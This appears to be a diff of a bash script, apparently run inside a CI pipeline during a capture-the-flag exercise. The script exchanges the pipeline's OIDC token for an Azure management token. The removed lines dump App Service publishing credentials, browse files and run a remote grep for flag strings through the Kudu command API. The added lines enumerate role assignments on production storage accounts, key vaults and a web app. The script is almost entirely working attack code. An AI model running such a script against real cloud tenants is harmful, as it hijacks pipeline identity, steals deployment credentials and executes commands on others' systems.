@@ -1,13 +1,13 @@
 #!/usr/bin/env bash
 set +e
-T="$AZURE_TENANT_ID"; C="$AZURE_CLIENT_ID"
-J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"|python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
-MT=$(curl -sS -X POST -d '' "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d client_id=$C -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion="$J" --data-urlencode scope=https://management.azure.com/.default|python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
-base="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites"
-for app in app-tbl-storefront-prod app-tbl-reporting-prod; do
- echo APP=$app
- creds=$(curl -sS -X POST -d '' -H "Authorization: Bearer $MT" "$base/$app/config/publishingcredentials/list?api-version=2022-03-01"); echo "CREDS=$creds" | head -c 12000
- user=$(echo "$creds"|python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))'); pass=$(echo "$creds"|python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))')
- H="https://$app.scm.azurewebsites.net"; echo "VFS=$(curl -sS -u "$user:$pass" "$H/api/vfs/site/wwwroot/"|head -c 12000)"
- echo "CMD=$(curl -sS -u "$user:$pass" -H 'Content-Type: application/json' -X POST "$H/api/command" -d '{"command":"grep -RaiE \"DF26\\{|flag\" /home/site 2>/dev/null | head -c 20000","dir":"/home/site/wwwroot"}'|head -c 22000)"
+T="$AZURE_TENANT_ID"; C="$AZURE_CLIENT_ID"; S="$AZURE_SUBSCRIPTION_ID"; RG=rg-tbl-platform-prod-sea
+J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"|jq -r .value)
+arm(){ curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d client_id="$C" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion="$J" --data-urlencode scope=https://management.azure.com/.default|jq -r .access_token; }
+A=$(arm); B="Authorization: Bearer $A"; BASE="https://management.azure.com/subscriptions/$S"
+echo ROLE_RG
+curl -sS -H "$B" "$BASE/resourceGroups/$RG/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"|jq -c '.value[]?|{p:.properties.principalId,r:(.properties.roleDefinitionId|split("/")|last),s:.properties.scope}'
+for R in Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz Microsoft.Storage/storageAccounts/sttblbackupprodx3euoz Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz Microsoft.Storage/storageAccounts/sttblarchiveprodx3euoz Microsoft.KeyVault/vaults/kv-tbl-prod-x3euoz Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz Microsoft.Web/sites/app-tbl-storefront-prod; do
+ echo RESOURCE_$R
+ curl -sS -H "$B" "$BASE/resourceGroups/$RG/providers/$R/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01"|jq -c '.value[]?|{p:.properties.principalId,r:(.properties.roleDefinitionId|split("/")|last),s:.properties.scope}'
 done
+for id in 17d1049b-9a84-46fb-8f53-869881c3d3ab acdd72a7-3385-48ef-bd42-f606fba81ae7 8e3af657-a8ff-443c-a75c-2fe8c4bcb635; do echo DEF_$id; curl -sS -H "$B" "$BASE/providers/Microsoft.Authorization/roleDefinitions/$id?api-version=2022-04-01"|jq -c '.properties|{roleName,description}'; done
